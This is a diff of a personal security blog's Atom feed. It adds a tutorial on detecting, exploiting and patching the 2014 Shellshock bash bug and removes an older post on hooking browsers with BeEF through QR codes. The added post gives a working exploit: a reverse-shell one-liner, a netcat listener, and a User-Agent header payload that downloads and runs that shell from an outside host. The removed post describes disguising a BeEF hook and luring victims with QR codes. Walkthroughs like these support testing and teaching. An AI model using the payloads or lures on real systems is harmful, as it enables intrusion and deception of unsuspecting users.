@@ -4,7 +4,7 @@
   <title><![CDATA[cubalo]]></title>
   <link href="http://cubalo.github.io/atom.xml" rel="self"/>
   <link href="http://cubalo.github.io/"/>
-  <updated>2014-04-19T17:41:03-04:00</updated>
+  <updated>2014-09-26T17:23:41-04:00</updated>
   <id>http://cubalo.github.io/</id>
   <author>
     <name><![CDATA[Matt]]></name>
@@ -12,6 +12,81 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Detecting, Exploiting, and Patching the Shellshock Bug]]></title>
+    <link href="http://cubalo.github.io/blog/2014/09/26/detecting/"/>
+    <updated>2014-09-26T15:50:40-04:00</updated>
+    <id>http://cubalo.github.io/blog/2014/09/26/detecting</id>
+    <content type="html"><![CDATA[<h2>Overview</h2>
+
+
+<p>Wednesday, CVE-2014-6271, now called &ldquo;shellshock&rdquo; or the &ldquo;bash bug&rdquo;, was published. The following description was provided:</p>
+
+<p>&ldquo;GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege boundary from Bash execution, aka ShellShock.&rdquo;</p>
+
+<p>It was given a CVSS score of 10.0, the highest possible.</p>
+
+<h2>Detecting</h2>
+
+
+<p>Luckily, if you have access to the remote system, manual validation is very easy. Simply paste the following code into a terminal and execute.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>env var='() { ignore this;}; echo vulnerable' bash -c /bin/true</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If the output contains the string &ldquo;vulnerable&rdquo; then your version of bash is affected.</p>
+
+<p>To test remotely, follow the exploitation steps below, omitting the reverse shell and setting the command in the request headers to something like &ldquo;curl <a href="http://mysite.com/something.txt">http://mysite.com/something.txt</a>&rdquo; and watch your logs. If you see the host connect and access that file, it is vulnerable.</p>
+
+<h2>Exploiting</h2>
+
+
+<p>Exploiting this bug is a little bit more fun. At the time I created this method, there were no working tools to test. I had only seen someone online&rsquo;s log and tried to emulate that to the best of my ability.</p>
+
+<p>The first step is to hop on you VPS and create a file with a simple bash reverse shell in it and throw that in your web root.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bash -i >& /dev/tcp/your.ip.addr.here/31337 0>&1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Once that is set up, turn on Apache and start a netcat listener on the port you specified in the reverse shell file.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/etc/init.d/apache2 start
+</span><span class='line'>nc -l -p 31337</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now that the infrastructure is set up, find a vulnerable host. This should be a web server with a vulnerable CGI file on it. Once you&rsquo;ve identified it, fire up Burp Suite.</p>
+
+<p>Start the proxy and configure your browser to use it. Navigate to the site/file that you want to test, intercept the request, right click and choose &ldquo;Send to Spider.&rdquo;
+Pause the Spider and go into the Spider options tab. Scroll down to the Request Headers section, click the &ldquo;User-Agent&rdquo; header, and then click the Edit button. Change the user agent to the following string:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>User-Agent: () { :; }; wget -O /tmp/callback http://your.ip.addr.here/reverseshell; chmod 777 /tmp/callback; cd /tmp; ./callback;</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://cubalo.github.io/images/user_agent_header-SHELLSHOCK.png"></p>
+
+<p>This uses wget to download you reverse shell you put on your web server and save it to the /tmp/ directory, change the file permissions to 777, and run the reverse shell. If successful, this will call back to your netcat listener.
+If you can get it to call back and open the shell, you&rsquo;ll have a session as the user on the remote system.</p>
+
+<p>NOTE: In Burp, I chose to use the Spider as I am a fan of automating as much as possible, but Intruder or Repeater work just as well.</p>
+
+<p><h2>Remediating<h2></p>
+
+<p>Remediating the issue is pretty straightforward now that most operating systems have a patch in their repositories. For instance, I patched my Kali box with a simple &ldquo;apt-get update &amp;&amp; apt-get -y dist-upgrade.&rdquo; However, if you do not have the luxury of being able to do full distro upgrades, building from source is always an option and many distros are providing tutorials.</p>
+
+<p>Once you&rsquo;ve updated, make sure you run through the detection command mentioned above. If it responds with the following errors, your system is patched. CVE-2014-7169 notes that the original patch was incorrect, so make sure to stay on top of updates for the next week or so.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bash: warning: var: ignoring function definition attempt
+</span><span class='line'>bash: error importing function definition for `var'</span></code></pre></td></tr></table></div></figure></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Manually patching Kali's OpenSSL]]></title>
@@ -647,50 +722,6 @@ wlan1 IEEE 802.11abgn ESSID:off/any
 <p><strong>Problem: Where does The Plague hide his money?</strong></p>
 <p>This is a reference to the movie <em>Hackers </em>(1995). Unfortunately, the only way to know the answer to this is to have watched the movie.</p>
 <p><strong>Answer: <strong>03087-08351-27H</strong></strong></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Hooking Browsers with BeEF & QR Codes]]></title>
-    <link href="http://cubalo.github.io/blog/2013/04/12/fun-with-beef-qr-codes/"/>
-    <updated>2013-04-12T00:00:00-04:00</updated>
-    <id>http://cubalo.github.io/blog/2013/04/12/fun-with-beef-qr-codes</id>
-    <content type="html"><![CDATA[<p>For those unfamiliar with the Browser Exploitation Framework Project, or BeEF, it is a tool that can be used to launch attacks against the often only door left open, the web browser. Once the browser is compromised, BeEF can launch further attacks to control the system. While some of us know not to scan any QR code we find, most people assume that they are safe. You can find them posted all around. Sales circulars, marketing materials, magazines, they&#8217;re everywhere. Why not take advantage of that inherent trust?</p>
-<p>For this tutorial, I&#8217;m going to assume that you are running Backtrack 5 R3 or Kali. If not, installation instructions can be found <a href="https://github.com/beefproject/beef/wiki/Installation">here</a>.</p>
-<h1>customhook</h1>
-<p>First things first, we need to edit the customhook config. When BeEF fires up, it sets the hook location to your.i.p.address/hook/ which is pretty obvious. So by editing the config, we can set a custom name for our hook and make it a little less conspicuous. The config can be found at $BEEF_ROOT/extensions/customhook/config.yaml. Pop that open with your favorite editor and change the values to whatever you want. Its pretty self-explanatory.</p>
-<pre>#
-# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
-# Browser Exploitation Framework (BeEF) - http://beefproject.com
-# See the file 'doc/COPYING' for copying permission
-#
-beef:
-    extension:
-        customhook:
-            enable: true
-            name: 'Custom Hook Point with iFrame Impersonation'
-            customhook_path: "/notice"
-            customhook_target: "http://heyyeyaaeyaaaeyaeyaa.com/"
-            customhook_title: "Notice"</pre>
-<p>Make sure you set &#8220;enable:&#8221; to true.</p>
-<h1>qrcode</h1>
-<p>Next, we need to edit the qrcode extension&#8217;s config. All you need to do here is set &#8220;enable:&#8221; to true and set the &#8220;target:&#8221; to your customhook location (or a bit.ly link of it if you&#8217;re feeling extra sneaky ;) ). It can be found at $BEEF_ROOT/extensions/qrcode/config.yaml.</p>
-<pre>#
-# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
-# Browser Exploitation Framework (BeEF) - http://beefproject.com
-# See the file 'doc/COPYING' for copying permission
-#
-beef:
-    extension:
-        qrcode:
-            name: 'QR Code Generator'
-            enable: true
-            authors: ["xntrik"]
-            target: ["mybeefserver.com/notice"]
-            qrsize: "300x300"</pre>
-<p>Now when you start BeEF, it will generate a QR code for your hook. You can also append the URL of your customhook to https://chart.googleapis.com/chart?cht=qr&amp;chs=300x300&amp;chl= and it&#8217;ll generate a code for you.</p>
-<h1>Attack!</h1>
-<p>Once you fire up BeEF after making the changes, it will create your custom hook in the location your set as well as provide you a URL where you can download your QR code from. Now the only thing left to do is figure out how you want to use it. &#8220;Scan this to try our new mobile banking app for your iPhone!&#8221; The possibilities are endless.</p>
 ]]></content>
   </entry>
   
